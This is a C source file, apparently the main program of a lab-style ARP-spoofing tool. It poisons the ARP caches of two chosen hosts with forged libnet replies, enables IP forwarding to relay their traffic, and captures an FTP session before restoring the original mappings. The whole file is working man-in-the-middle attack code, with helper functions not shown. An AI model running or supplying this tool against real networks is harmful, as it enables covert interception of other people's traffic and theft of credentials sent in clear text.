#include <inquisitor.h>

#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#define IP_FORWARD_PATH "/proc/sys/net/ipv4/ip_forward"

// Current kernel IPv4 forwarding state: 1 on, 0 off, -1 unknown.
static int	read_ip_forward(void) {
	char	buf[8] = { 0 };
	int		fd = open(IP_FORWARD_PATH, O_RDONLY);

	if (fd < 0)
		return (-1);
	int n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return (-1);
	return (buf[0] == '1' ? 1 : 0);
}

static void	write_ip_forward(int value) {
	int	fd = open(IP_FORWARD_PATH, O_WRONLY);

	if (fd < 0) {
		WARN("Cannot open %s: %s\n", IP_FORWARD_PATH, strerror(errno));
		return;
	}
	if (write(fd, value ? "1\n" : "0\n", 2) < 0)
		WARN("Cannot set ip_forward: %s\n", strerror(errno));
	close(fd);
}

int	main(int argc, char *argv[], char *env[]) {
	set_log_level(LEVEL_INFO);
	parse_env(env);

	t_args	args;
	if (parse_args(argc, argv, &args)) {
		ERR("Usage: %s <ip-src> <mac-src> <ip-dst> <mac-dst> [-v] [-w <dir>]\n", argv[0]);
		return (1);
	}
	if (args.verbose)
		set_log_level(LEVEL_DEBUG);

	struct ether_addr own_mac;
	if (get_mac(IFACE_NAME, &own_mac)) {
		ERR("Failed to get MAC of %s\n", IFACE_NAME);
		return (1);
	}

	char		errbuf[LIBNET_ERRBUF_SIZE];
	libnet_t	*l_client = libnet_init(LIBNET_LINK, IFACE_NAME, errbuf);
	if (!l_client) {
		ERR("libnet_init: %s\n", errbuf);
		return (1);
	}

	libnet_t	*l_server = libnet_init(LIBNET_LINK, IFACE_NAME, errbuf);
	if (!l_server) {
		ERR("libnet_init: %s\n", errbuf);
		return (1);
	}

	build_arp_reply(&own_mac, &(args.src_addr), &(args.dst_mac), &(args.dst_addr), l_client);
	build_arp_reply(&own_mac, &(args.dst_addr), &(args.src_mac), &(args.src_addr), l_server);

	// Relay traffic transparently so the FTP session survives the MITM.
	// Remember the old value to restore it when we stop.
	int	old_forward = read_ip_forward();
	write_ip_forward(1);

	int	ret = capture(&args, l_client, l_server);

	// Ctrl+C landed: undo the poison by announcing the real MAC <-> IP pairs.
	// ARP is best-effort, so repeat a few times to be sure the caches heal.
	INFO("Restoring ARP tables...\n");
	libnet_clear_packet(l_client);
	build_arp_reply(&(args.src_mac), &(args.src_addr), &(args.dst_mac), &(args.dst_addr), l_client);
	libnet_clear_packet(l_server);
	build_arp_reply(&(args.dst_mac), &(args.dst_addr), &(args.src_mac), &(args.src_addr), l_server);
	for (int i = 0; i < 5; i++) {
		send_arp(l_client, "client");
		send_arp(l_server, "server");
		usleep(200 * 1000);
	}

	if (old_forward == 0)
		write_ip_forward(0);

	destroy_arp_reply(l_client);
	destroy_arp_reply(l_server);
	return (ret);
}